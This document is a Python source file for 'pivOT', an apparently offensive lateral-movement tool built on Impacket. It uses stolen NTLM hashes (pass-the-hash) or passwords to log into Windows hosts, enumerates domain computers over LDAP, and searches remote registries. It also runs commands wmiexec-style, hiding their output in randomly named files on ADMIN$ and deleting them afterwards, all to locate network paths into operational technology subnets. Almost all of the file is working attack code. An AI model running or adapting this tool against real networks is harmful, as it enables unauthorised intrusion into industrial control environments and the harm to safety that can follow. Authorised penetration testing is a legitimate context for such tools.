#!/usr/bin/env python3

"""
pivOT.py
--------
A single Python script that:
  1) Checks remote registry for OT IP references.
  2) Uses WMI/DCOM to run commands (like 'netstat -ano') wmiexec-style,
     storing output on an SMB share.
  3) Enumerates domain machines (LDAP) if no targets are given.
  4) Supports pass-the-hash and password logins.
  5) Includes a --debug flag for verbose logging.

This version includes some modest UI enhancements, color-coded output (using colorama),
and additional checks for connectivity, Kerberos fallback to NTLM, etc.
"""

import argparse
import concurrent.futures
import csv
import ipaddress
import json
import os
import random
import re
import socket
import sys
import time
import traceback
import uuid
from typing import List, Tuple, Dict

# 3rd-party
import colorama
from colorama import Fore, Style
from ldap3 import Server, Connection, NTLM, ALL

# Impacket
from impacket.smbconnection import SMBConnection, SessionError
from impacket.dcerpc.v5 import rrp, transport
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL

# Constants for older Impacket
HKEY_LOCAL_MACHINE = 0x80000002
MAXIMUM_ALLOWED = 0x02000000

###############################################################################
# COLORAMA INIT
###############################################################################
colorama.init(autoreset=True)

RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
MAGENTA = Fore.MAGENTA
CYAN = Fore.CYAN
RESET = Style.RESET_ALL

###############################################################################
# LOGGING HELPERS
###############################################################################
def log_error(message: str):
    """Prints error messages in red."""
    print(f"{RED}{message}{RESET}")

def log_debug(message: str, debug=False):
    """
    Prints a debug message if `debug=True`.
    The message is printed in yellow for visibility.
    """
    if debug:
        print(f"{YELLOW}[debug]{RESET} {message}")

def log_info(message: str):
    """Prints informational messages in cyan."""
    print(f"{CYAN}{message}{RESET}")

###############################################################################
# QUICK SMB REACHABILITY CHECK
###############################################################################
def quick_smb_check(host: str, port: int = 445, timeout: float = 3.0) -> bool:
    """
    Returns True if we can connect to the SMB port (445), False otherwise.
    Helps skip obviously unreachable hosts before trying heavier operations.
    """
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False

###############################################################################
# HELPER FUNCTIONS: OT Subnet Parsing & Checks
###############################################################################
def parse_ot_subnets(subnet_strings: List[str]) -> List[ipaddress.ip_network]:
    """
    Converts a list of subnet strings (e.g. ["10.10.0.0/16"]) into a list of
    ip_network objects, ignoring or logging invalid formats.
    """
    networks = []
    for subnet in subnet_strings:
        subnet = subnet.strip()
        if not subnet:
            continue
        if '/' not in subnet:
            # Try to infer a mask if one isn't present.
            if subnet.count('.') == 2 and subnet.endswith('.'):
                subnet = f"{subnet}0.0/16"
            else:
                subnet = f"{subnet}/32"
        try:
            net_obj = ipaddress.ip_network(subnet, strict=False)
            networks.append(net_obj)
        except ValueError:
            log_error(f"[!] Invalid subnet format '{subnet}' - skipping.")
    return networks

def is_ip_in_ot_subnets(ip_address: str, ot_networks: List[ipaddress.ip_network]) -> bool:
    """
    Checks whether a given IP address string falls within any of the specified
    OT subnets.
    """
    try:
        ip_obj = ipaddress.ip_address(ip_address)
    except ValueError:
        # Not a valid IP string
        return False
    return any(ip_obj in net for net in ot_networks)

###############################################################################
# LDAP OPERATIONS (for enumerating domain machines if no direct targets)
###############################################################################
def create_ldap3_connection(
    domain: str,
    username: str,
    password: str,
    dc_ip: str = None,
    use_kerberos: bool = False,
    debug: bool = False
) -> Connection:
    """
    Establishes an LDAP3 connection to the specified domain controller (or domain),
    performing an NTLM bind with the provided credentials.
    """
    host_for_ldap = dc_ip if dc_ip else domain
    server_url = f"ldap://{host_for_ldap}:389"
    log_debug(f"Attempting LDAP connect to: {server_url}", debug)

    server = Server(server_url, get_info=ALL, use_ssl=False)
    user_credentials = f"{domain}\\{username}"

    conn = Connection(
        server,
        user=user_credentials,
        password=password,
        authentication=NTLM,
        auto_referrals=False,
        receive_timeout=60
    )
    if conn.bind():
        log_debug("NTLM LDAP bind success", debug)
        return conn
    else:
        raise Exception(f"Failed LDAP bind: {conn.result}")

def enumerate_domain_computers_ldap(
    domain: str,
    username: str,
    password: str,
    kerberos: bool = False,
    dc_ip: str = None,
    debug: bool = False,
    lm_hash: str = "",
    nt_hash: str = ""
) -> List[str]:
    """
    Enumerates domain-joined computers via LDAP. This is useful if you do not
    already have a list of targets.
    """
    computers = []
    try:
        # If NT hash is provided, override the password with LM:NT or :NT
        if nt_hash:
            pass_the_hash = f"{lm_hash if lm_hash else ''}:{nt_hash}"
            password = pass_the_hash
            log_debug(f"Using hash: {pass_the_hash}", debug)

        conn = create_ldap3_connection(domain, username, password, dc_ip=dc_ip,
                                       use_kerberos=kerberos, debug=debug)
        if not conn.bound:
            return computers

        # Attempt to derive the base DN from server info
        base_dn = None
        if conn.server.info:
            naming_contexts = conn.server.info.naming_contexts
            if naming_contexts:
                base_dn = naming_contexts[0]

        if not base_dn:
            base_dn = "DC=" + ",DC=".join(domain.split("."))

        log_debug(f"Using baseDN: {base_dn}", debug)

        # Search for all computer objects
        search_filter = "(objectClass=computer)"
        attributes = ["dNSHostName", "sAMAccountName"]
        conn.search(base_dn, search_filter, attributes=attributes, paged_size=1000)

        # Extract DNS or SAM name
        for entry in conn.response:
            if entry.get('type') == 'searchResEntry':
                att_map = entry.get('attributes', {})
                dns_name = att_map.get('dNSHostName')
                sam_name = att_map.get('sAMAccountName')
                if isinstance(dns_name, list) and dns_name:
                    dns_name = dns_name[0]
                if isinstance(sam_name, list) and sam_name:
                    sam_name = sam_name[0]
                if dns_name:
                    computers.append(dns_name.lower())
                elif sam_name:
                    computers.append(sam_name.replace('$', '').lower())

        conn.unbind()

    except Exception as exc:
        log_debug(f"LDAP enumeration error: {exc}", debug)
        if debug:
            traceback.print_exc()
        return []

    # Return unique values
    return list(set(computers)) if computers else []

###############################################################################
# SMB SESSION - KERBEROS → NTLM FALLBACK
###############################################################################
def create_smb_session_kerb_fallback(
    target_host: str,
    domain: str,
    username: str,
    password: str,
    lm_hash: str = "",
    nt_hash: str = "",
    use_kerberos: bool = False,
    debug: bool = False
) -> SMBConnection:
    """
    If Kerberos is requested, try kerb login first. If that fails, or if Kerberos
    is not requested at all, fallback to NTLM/pass-the-hash.
    """
    if use_kerberos:
        # Attempt Kerberos first
        try:
            log_debug("Attempting Kerberos SMB login...", debug)
            smb_conn = SMBConnection(remoteName=target_host, remoteHost=target_host, sess_port=445)
            smb_conn.kerberosLogin(username, password, domain,
                                   lmhash=lm_hash, nthash=nt_hash)
            log_debug("Kerberos SMB login succeeded!", debug)
            return smb_conn
        except SessionError as kerb_exc:
            # Show error code in an integer-friendly way
            err_code = kerb_exc.getErrorCode() if hasattr(kerb_exc, 'getErrorCode') else 0
            log_debug(f"Kerberos login failed with code=0x{err_code:x}, falling back to NTLM...", debug)
            # Fall back to NTLM
    else:
        log_debug("Kerberos not requested; using NTLM/pass-the-hash directly.", debug)

    # If not using Kerberos, or if Kerberos failed, do NTLM
    smb_conn = SMBConnection(remoteName=target_host, remoteHost=target_host, sess_port=445)
    smb_conn.login(
        user=username,
        password=password,
        domain=domain,
        lmhash=lm_hash,
        nthash=nt_hash
    )
    log_debug("NTLM SMB login succeeded.", debug)
    return smb_conn

###############################################################################
# REGISTRY SEARCH
###############################################################################
def registry_search_for_ot(
    smb_conn: SMBConnection,
    ot_subnets: List[ipaddress.ip_network],
    debug: bool = False
) -> List[Tuple[str, str, str]]:
    """
    Searches the remote registry for values falling within the OT subnets.
    Returns a list of (key, value_name, ip_string) tuples for each match.
    """
    matches = []
    try:
        pipe_uri = f"ncacn_np:{smb_conn.getRemoteHost()}[\\PIPE\\winreg]"
        log_debug(f"Opening named pipe for registry: {pipe_uri}", debug)
        rpc_transport = transport.DCERPCTransportFactory(pipe_uri)
        rpc_transport.set_smb_connection(smb_conn)

        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(rrp.MSRPC_UUID_RRP)

        # Open HKLM
        local_machine = rrp.hOpenLocalMachine(dce)
        lm_handle = local_machine['phKey']

        # Target path for interface configs
        net_key = rrp.hBaseRegOpenKey(
            dce, lm_handle, "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces"
        )
        interfaces_handle = net_key['phkResult']

        # Enumerate subkeys
        idx = 0
        while True:
            try:
                enum_key = rrp.hBaseRegEnumKey(dce, interfaces_handle, idx)
                sub_key_name = enum_key['lpNameOut']
                idx += 1

                # Open subkey
                sub_open = rrp.hBaseRegOpenKey(dce, interfaces_handle, sub_key_name)
                sub_handle = sub_open['phkResult']

                # Enumerate values
                val_idx = 0
                while True:
                    try:
                        valenum = rrp.hBaseRegEnumValue(dce, sub_handle, val_idx)
                        val_idx += 1

                        value_name = valenum['lpValueNameOut']
                        value_type = valenum['lpType']
                        raw_data = valenum['lpData']
                        data_parsed = rrp.unpackValue(value_type, raw_data)

                        # Check for single string or list of strings
                        if isinstance(data_parsed, str):
                            if is_ip_in_ot_subnets(data_parsed, ot_subnets):
                                matches.append((sub_key_name, value_name, data_parsed))
                        elif isinstance(data_parsed, list):
                            for item in data_parsed:
                                if is_ip_in_ot_subnets(item, ot_subnets):
                                    matches.append((sub_key_name, value_name, item))

                    except DCERPCException as dcerpc_exc:
                        # 0x103 means no more data
                        if hasattr(dcerpc_exc, 'error_code') and dcerpc_exc.error_code == 0x103:
                            break
                        else:
                            log_debug(f"Registry value enum error: {dcerpc_exc}", debug)
                            break
                rrp.hBaseRegCloseKey(dce, sub_handle)

            except DCERPCException as dcerpc_exc:
                # 0x103 means no more subkeys
                if hasattr(dcerpc_exc, 'error_code') and dcerpc_exc.error_code == 0x103:
                    break
                else:
                    log_debug(f"Registry subkey enum error: {dcerpc_exc}", debug)
                    break

        rrp.hBaseRegCloseKey(dce, interfaces_handle)
        rrp.hBaseRegCloseKey(dce, lm_handle)
        dce.disconnect()

    except DCERPCException as dcerpc_exc:
        if 'ACCESS_DENIED' in str(dcerpc_exc).upper():
            log_debug("[!] Registry Access Denied.", debug)
            raise
        else:
            if debug:
                traceback.print_exc()
            raise
    except Exception as exc:
        if debug:
            traceback.print_exc()
        raise exc

    return matches

###############################################################################
# WMI NETSTAT (WMIC-STYLE)
###############################################################################
def generate_random_filename() -> str:
    """
    Generates a random filename that looks somewhat like a temp/log file.
    """
    return f"tmp_{uuid.uuid4().hex[:6]}.log"

def wmi_exec_command(
    dcom_conn: DCOMConnection,
    smb_conn: SMBConnection,
    command: str,
    debug: bool = False
) -> str:
    """
    Executes a command on the remote host using WMI/DCOM, redirecting stdout/stderr
    to a file on the ADMIN$ share. The contents are then read via SMB.
    """
    share_name = "ADMIN$"
    output_file = generate_random_filename()

    # Build Windows UNC path for remote output
    remote_output_path = f'\\\\127.0.0.1\\{share_name}\\{output_file}'
    local_output_path = output_file

    log_debug(f"Using output file: {output_file}", debug)
    log_debug(f"Remote path: {remote_output_path}", debug)

    i_interface = dcom_conn.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
    i_wbem_login = wmi.IWbemLevel1Login(i_interface)
    i_wbem_services = i_wbem_login.NTLMLogin('//./root/cimv2', NULL, NULL)
    i_wbem_login.RemRelease()

    win32_process, _ = i_wbem_services.GetObject('Win32_Process')

    # Execute command, redirecting output
    working_dir = 'C:\\Windows\\System32'
    final_cmd = f'cmd.exe /Q /c {command} > {remote_output_path} 2>&1'
    log_debug(f"Final WMI command: {final_cmd}", debug)

    process_info = win32_process.Create(final_cmd, working_dir, None)
    if process_info.ReturnValue != 0:
        return f"[!] WMI command exec failed, Win32_Process.Create returned {process_info.ReturnValue}."

    # Wait a bit for the command to complete and the file to appear
    time.sleep(3)

    output_data = b''
    max_retries = 3
    attempts = 0

    # Retry reading the file up to 3 times
    while attempts < max_retries:
        try:
            log_debug(f"Reading attempt {attempts + 1} from {share_name}:{local_output_path}", debug)

            def output_callback(data_block):
                nonlocal output_data
                output_data += data_block

            smb_conn.getFile(share_name, local_output_path, output_callback)
            break
        except Exception as read_exc:
            attempts += 1
            if attempts == max_retries:
                log_debug(f"Final read attempt failed: {str(read_exc)}", debug)
                return f"[!] Error reading output after {max_retries} attempts: {read_exc}"
            time.sleep(2)

    # Remove the file from the share
    try:
        smb_conn.deleteFile(share_name, local_output_path)
    except:
        pass

    # Attempt to decode the output in codepage 437, fallback to UTF-8
    try:
        return output_data.decode('cp437', errors='replace')
    except:
        return output_data.decode('utf-8', errors='replace')

def wmi_netstat_search(
    target: str,
    username: str,
    password: str,
    domain: str,
    smb_conn: SMBConnection,
    ot_subnets: List[ipaddress.ip_network],
    kerberos: bool = False,
    lm_hash: str = "",
    nt_hash: str = "",
    debug: bool = False
) -> List[str]:
    """
    Creates a DCOMConnection to run "netstat -ano" remotely, capturing output
    via an ADMIN$ share file. Any remote IP address matching OT subnets is returned.
    """
    findings = []
    try:
        log_debug(f"DCOMConnection to {target} for WMI. Kerberos={kerberos}", debug)
        dcom = DCOMConnection(
            target,
            username,
            password,
            domain,
            lm_hash,
            nt_hash,
            None,
            oxidResolver=True,
            doKerberos=kerberos,
            remoteHost=target
        )

        # Run netstat -ano
        netstat_out = wmi_exec_command(dcom, smb_conn, "netstat -ano", debug=debug)
        # log_debug(f"Raw netstat output:\n{netstat_out}", debug=debug)

        # If there's an error marker from wmi_exec_command, store it
        if netstat_out.startswith("[!]"):
            findings.append(netstat_out)
        else:
            # Parse lines looking for remote IP addresses that fall in OT subnets
            for line in netstat_out.splitlines():
                line_stripped = line.strip()
                # Skip header lines or empties
                if not line_stripped or line_stripped.startswith(("Proto", "Active")):
                    continue

                # Basic IPv4 line parse
                match = re.match(r'^(TCP|UDP)\s+([\d\.]+):(\d+)\s+([\d\.]+):(\d+)\s+(.*)', line_stripped)
                if match:
                    remote_ip = match.group(4)
                    if is_ip_in_ot_subnets(remote_ip, ot_subnets):
                        findings.append(line_stripped)

        dcom.disconnect()

    except DCERPCException as e:
        if 'ACCESS_DENIED' in str(e).upper():
            findings.append("[!] WMI Access Denied.")
        else:
            findings.append(f"[!] WMI netstat error: {e}")
            if debug:
                traceback.print_exc()
    except Exception as exc:
        log_debug(f"Exception in WMI netstat search: {str(exc)}", debug)
        if debug:
            traceback.print_exc()
        findings.append(f"[!] Exception in WMI netstat search: {str(exc)}")

        # Example: fallback to psexec or smbexec if WMI is blocked
        # fallback_output = psexec_netstat_fallback(...)
        # findings.extend(fallback_output)

    return findings

###############################################################################
# TARGET CHECKS
###############################################################################
def check_target_for_ot(
    target: str,
    username: str,
    password: str,
    domain: str,
    ot_subnets: List[ipaddress.ip_network],
    do_registry: bool = True,
    do_netstat: bool = True,
    kerberos: bool = False,
    lm_hash: str = "",
    nt_hash: str = "",
    debug: bool = False
) -> Dict:
    """
    Checks a single target for potential OT IP references in its registry and/or
    netstat output. Returns a dictionary with all findings.
    """
    # Quick SMB connectivity check
    if not quick_smb_check(target):
        log_error(f"{target}: SMB 445 unreachable, skipping.")
        return {
            "target": target,
            "registry_ot_matches": ["[!] Unreachable"],
            "netstat_ot_matches": ["[!] Unreachable"]
        }

    result = {
        "target": target,
        "registry_ot_matches": [],
        "netstat_ot_matches": []
    }

    # Create an SMB session (Kerberos fallback approach)
    try:
        smb_conn = create_smb_session_kerb_fallback(
            target_host=target,
            domain=domain,
            username=username,
            password=password,
            lm_hash=lm_hash,
            nt_hash=nt_hash,
            use_kerberos=kerberos,
            debug=debug
        )
        dialect = smb_conn.getDialect()
        log_debug(f"SMB Dialect={dialect} on {target}", debug)
    except Exception as smb_exc:
        error_message = f"[!] SMB connection error: {smb_exc}"
        log_debug(error_message, debug)
        if debug:
            traceback.print_exc()
        result["registry_ot_matches"] = [error_message]
        result["netstat_ot_matches"] = [error_message]
        return result

    # If requested, check the registry
    if do_registry:
        try:
            reg_hits = registry_search_for_ot(smb_conn, ot_subnets, debug=debug)
            result["registry_ot_matches"] = reg_hits
        except DCERPCException as reg_exc:
            err_msg = f"[!] Registry check error: {reg_exc}"
            log_debug(err_msg, debug)
            if debug:
                traceback.print_exc()
            result["registry_ot_matches"] = [err_msg]
        except Exception as reg_exc:
            err_msg = f"[!] Registry check error: {reg_exc}"
            log_debug(err_msg, debug)
            if debug:
                traceback.print_exc()
            result["registry_ot_matches"] = [err_msg]

    # If requested, run netstat remotely via WMI/DCOM
    if do_netstat:
        net_hits = wmi_netstat_search(
            target,
            username,
            password,
            domain,
            smb_conn,
            ot_subnets,
            kerberos=kerberos,
            lm_hash=lm_hash,
            nt_hash=nt_hash,
            debug=debug
        )
        result["netstat_ot_matches"] = net_hits

    # Close the SMB session
    smb_conn.close()
    return result

###############################################################################
# OUTPUT HELPERS
###############################################################################
def save_results_json(filename: str, data: List[Dict]):
    """Saves the final scan results as JSON."""
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)

def save_results_csv(filename: str, data: List[Dict]):
    """Saves the final scan results as CSV."""
    with open(filename, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(["Target", "RegistryOTMatches", "NetstatOTMatches"])
        for row in data:
            target = row["target"]
            reg = "; ".join(str(item) for item in row["registry_ot_matches"])
            net = "; ".join(str(item) for item in row["netstat_ot_matches"])
            writer.writerow([target, reg, net])

###############################################################################
# MAIN
###############################################################################
def main():
    # A small ASCII banner for aesthetics (escape the backslash):
    print(f"""{MAGENTA}
           _       ____  ______
    ____  (_)   __/ __ \\_  __/
   / __ \\/ / | / / / / / / /   
  / /_/ / /| |/ / /_/ / / /    
 / .___/_/ |___/\\____/ /_/     
/_/                            

  pivOT: A pivoting utility for enumerating OT references
{RESET}""")

    parser = argparse.ArgumentParser(
        description="pivOT: WMI/Registry-based checks for OT IP addresses, supporting pass-the-hash & password auth."
    )
    parser.add_argument("-d","--domain", required=True, help="Domain name for SMB/DCOM/LDAP operations.")
    parser.add_argument("-u","--username", required=True, help="User account for authentication.")
    parser.add_argument("-p","--password", default="", help="Password (omit if pass-the-hash).")
    parser.add_argument("-H","--hashes", metavar="LM:NT", help="Pass-the-hash in 'LM:NT' or ':NT' format.")
    parser.add_argument("-k","--kerberos", action="store_true", help="Use Kerberos (requires valid TGT or password).")
    parser.add_argument("--dc-ip", help="Domain Controller IP for LDAP or Kerberos if needed.")

    parser.add_argument("-t","--target", help="Single target host (hostname or IP).")
    parser.add_argument("-f","--targets-file", help="File with a list of targets, one per line.")
    parser.add_argument("--threads", type=int, default=5, help="Number of parallel threads to use.")
    parser.add_argument("--no-registry", action="store_true", help="Skip the registry check.")
    parser.add_argument("--no-netstat", action="store_true", help="Skip the netstat check.")
    parser.add_argument("--ot-subnets", nargs="+", default=["10.10.0.0/16", "192.168.100.0/24"],
                        help="List of OT subnets to search for, e.g. 10.10.0.0/16.")
    parser.add_argument("--ldap-enum", action="store_true",
                        help="If no targets are specified, enumerate domain computers via LDAP.")
    parser.add_argument("--output-format", choices=["json","csv"], help="Save results in JSON or CSV format.")
    parser.add_argument("--output-file", help="Output filename for the results.")
    parser.add_argument("--debug", action="store_true", help="Enable verbose debug output.")

    args = parser.parse_args()

    # Handle pass-the-hash inputs
    lm_hash, nt_hash = "", ""
    if args.hashes:
        parts = args.hashes.split(':')
        if len(parts) == 2:
            lm_hash, nt_hash = parts
        else:
            # If there's only one part, treat it as the NT hash
            lm_hash, nt_hash = "", parts[0]

    # Gather target hosts
    targets = []
    if args.targets_file:
        with open(args.targets_file, "r") as tf:
            for line in tf:
                line = line.strip()
                if line:
                    targets.append(line)
    elif args.target:
        targets = [args.target]
    else:
        # If no targets given, optionally enumerate via LDAP
        if args.ldap_enum:
            log_debug("No direct targets. Enumerating from LDAP...", args.debug)
            targets = enumerate_domain_computers_ldap(
                domain=args.domain,
                username=args.username,
                password=args.password,
                kerberos=args.kerberos,
                dc_ip=args.dc_ip,
                lm_hash=lm_hash,
                nt_hash=nt_hash,
                debug=args.debug
            ) or []
            if not targets:
                log_error("[!] No targets found or specified. Exiting.")
                sys.exit(1)
            log_debug(f"LDAP enumeration found {len(targets)} host(s).", args.debug)
        else:
            log_error("[!] No targets specified and --ldap-enum not set. Exiting.")
            sys.exit(0)

    if not targets:
        log_error("[!] No targets found or specified. Exiting.")
        sys.exit(1)

    # Parse OT subnets
    ot_networks = parse_ot_subnets(args.ot_subnets)
    if not ot_networks:
        log_error("[!] No valid OT subnets provided. Exiting.")
        sys.exit(1)

    # Determine which checks to run
    run_registry_check = not args.no_registry
    run_netstat_check = not args.no_netstat

    log_debug(f"Starting scans on {len(targets)} host(s) with {args.threads} threads.", args.debug)

    # Conduct checks using multi-threading
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_host = {
            executor.submit(
                check_target_for_ot,
                t,
                args.username,
                args.password,
                args.domain,
                ot_networks,
                run_registry_check,
                run_netstat_check,
                args.kerberos,
                lm_hash,
                nt_hash,
                args.debug
            ): t for t in targets
        }

        # Simple progress indicator
        completed = 0
        total = len(future_to_host)
        for future in concurrent.futures.as_completed(future_to_host):
            host = future_to_host[future]
            try:
                scan_result = future.result()
                results.append(scan_result)
            except Exception as scan_exc:
                if args.debug:
                    traceback.print_exc()
                log_error(f"[!] Exception scanning {host}: {scan_exc}")
            finally:
                completed += 1
                log_info(f"[*] Completed {completed}/{total}: {host}")

    # Present the final results in the console
    print(f"\n{BLUE}================= SCAN RESULTS ================={RESET}")
    for r in results:
        print(f"\n{MAGENTA}---- {r['target']} ----{RESET}")
        registry_matches = r["registry_ot_matches"]
        netstat_matches = r["netstat_ot_matches"]

        # Registry hits
        if run_registry_check:
            if len(registry_matches) == 1 and isinstance(registry_matches[0], str) and registry_matches[0].startswith("[!]"):
                # Single error message
                log_error(f"  [Registry] {registry_matches[0]}")
            elif registry_matches:
                print(f"{GREEN}  [Registry] Potential OT references:{RESET}")
                for item in registry_matches:
                    # item could be an error string or a tuple
                    if isinstance(item, tuple) and len(item) == 3:
                        iface_key, value_name, ip_val = item
                        print(f"    Interface={iface_key}, Key={value_name}, Value={ip_val}")
                    else:
                        print(f"    {item}")
            else:
                print("  [Registry] No OT references found.")

        # Netstat hits
        if run_netstat_check:
            if len(netstat_matches) == 1 and netstat_matches[0].startswith("[!]"):
                # Single error message
                log_error(f"  [Netstat] {netstat_matches[0]}")
            elif netstat_matches and netstat_matches[0].startswith("[*]"):
                # Some other notice
                print(f"  [Netstat] {netstat_matches[0]} (no direct output captured)")
            elif netstat_matches:
                print(f"{GREEN}  [Netstat] Potential OT connections:{RESET}")
                for line in netstat_matches:
                    print(f"    {line}")
            else:
                print("  [Netstat] No OT connections found.")

    # Save to file if requested
    if args.output_format and args.output_file:
        if args.output_format == "json":
            save_results_json(args.output_file, results)
            log_info(f"[*] Results saved to JSON: {args.output_file}")
        else:
            save_results_csv(args.output_file, results)
            log_info(f"[*] Results saved to CSV: {args.output_file}")
    else:
        print("[*] No output file or format specified. Skipping file export.")

    print("\n[*] Done. Exiting.")


if __name__ == "__main__":
    main()
